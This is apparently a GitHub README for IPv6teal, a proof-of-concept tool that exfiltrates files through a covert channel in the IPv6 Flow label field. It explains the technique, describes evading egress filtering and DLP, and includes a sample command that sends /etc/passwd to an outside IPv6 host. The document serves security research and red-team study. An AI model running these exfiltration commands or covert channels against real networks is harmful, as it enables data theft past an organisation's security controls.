# IPv6teal

IPv6teal is a Python 3 tool to stealthily exfiltrate data from an internal network using a [covert channel](https://en.wikipedia.org/wiki/Covert_channel) 
built on top of the IPv6 header `Flow label` field.

It is made of 2 components:

- **[exfiltrate.py](./exfiltrate.py)**: Client-side component, used to exfiltrate data from an internal machine
- **[receive.py](./receive.py)**: Server-side component, used to received the exfiltrated data

Jump to: [Background](#Background) | [Usage](#Usage) | [F.A.Q.](#FAQ)

## Background

IPv6 packets have a [header](https://en.wikipedia.org/wiki/IPv6_packet#Fixed_header) containing a 20-bit field, `Flow label`.

![IPv6 header](https://user-images.githubusercontent.com/136675/61957346-9b870c00-afae-11e9-9ac3-4b2c0e0dedb7.png)

> **Flow label**: Originally created for giving real-time applications special service.
> When set to a non-zero value, it serves as a hint to routers and switches with multiple outbound paths 
> that these packets should stay on the same path, so that they will not be reordered.
>
> (Wikipedia)

This field can be set to an arbitrary value without impacting how the packet will be delivered to its destination.

Therefore, we can build a covert channel by storing data to exfiltrate in this field. The exfiltration script sends 1 
IPv6 packet per 20-bits of data, and the receiver script reconstructs the data by reading this field. The payload of every
IPv6 packet send contains a magic value, along with a sequence number, so the receiving end can determine _which_ IPv6 packets
are relevant for it to decode.


## Usage

Basic requirements:

- Both the client (where lies the data to exfiltrate) and the server (where the data should be exfiltrated) 
need to support IPv6 and to have an IPv6 address. For my tests, I used a $5/month DigitalOcean droplet.

- Both the client and the server need to have scapy installed (`pip install scapy==2.4.2`)

- Python 3

### Server

On the machine to which you wish to exfiltrate data, run `receive.py` as root.

```bash
$ python3 receive.py hashes

[-] Started receiver
```
### Client

On the machine where you wish to exfiltrate data, run `exfiltrate.py` as root.

```bash
$ python3 exfiltrate.py --help

usage: exfiltrate.py [-h] [--packet-sending-interval-ms SENDING_INTERVAL]
                     input_file destination

positional arguments:
  input_file            File to exfiltrate
  destination           IPv6 address where to exfiltrate data

optional arguments:
  -h, --help            show this help message and exit
  --packet-sending-interval-ms SENDING_INTERVAL
                        Number of milliseconds to wait between each IPv6
                        packet to send (default: 10)

```

Sample use:

```
$ python3 exfiltrate.py /etc/passwd 2a03:b0c0:3:d0::cee:8001  
                                                                                               
Sending 560 bytes (4480 bits) in 225 IPv6 packets...    
                                                                                                                                                     
..................................................                                                                                                                                                           
..................................................                                                                                                                                                           
..................................................                                                                                                                                                           
..................................................                                                                                                                                                           
........................                                          
                                                                                                                                           
done                                  
```



## F.A.Q.

### Couldn't we directly store the data in an ICMPv6 echo-request packet or in the payload of an IPv6 packet itself?

We definitely could. However this PoC was built for the (fictional) scenario of an enterprise network which would 
have strict egress network filtering such as ICMPv6 being blocked from the internal user network to the Internet, 
and/or where a DLP would be analyzing the payloads of IPv6/ICMPv6 packets.

Even in this case, it is unlikely that all outgoing IPv6 communications would be blocked and would therefore still
allow for data exfiltration using this technique. 

### If it fast?

Although the data being sent is compressed using GZIP, it's terribly slow. 
Each IPv6 packet sent over the network contains 20 _bits_ of data (that's two and a half ASCII characters).

During my tests I managed to transfer a 1.2 MB file of uncompressed random data in 30 minutes
across 2 machines of different DigitalOcean regions (Amsterdam and Frankfurt).

###  Is it reliable?

Absolutely not. Any IPv6 packet dropped will make the transmission fail. I intentionally did not want to 
make the tool reliable to keep it simple and avoid reimplementing a TCP-like pseudo network stack.

However, it does handle out-of-order IPv6 packets.

### Is the transmission encrypted?

No. If you are transmitting sensitive data, it's a good idea to encrypt the data on the client side before feeding it to
the exfiltration script.

### Can it handle large files?

Probably not. Maybe. In any case it will be slow.

### Why do the scripts need to run as root?

Because they craft raw IPv6 packets. If this is a problem, you can give the `cap_net_raw` capability to a 
non-superuser and have it run the scripts.

### Some packets are getting lost, what can I do?

Try to increase the value of the `--packet-sending-interval-ms` argument of the exfiltration script. 
It is 10 milliseconds by default, meaning that the programs waits 10ms before sending every new packet.
  
## About

Original idea from the paper _Covert Channels in IPv6_  by Norka B. Lucena, Grzegorz Lewandowski 
and Steve J. Chapin from Syracuse University.

For any question or bug report, feel free to [open an issue](https://github.com/christophetd/ipv6teal/issues/new) 
or to tweet [@christophetd](https://twitter.com/christophetd). 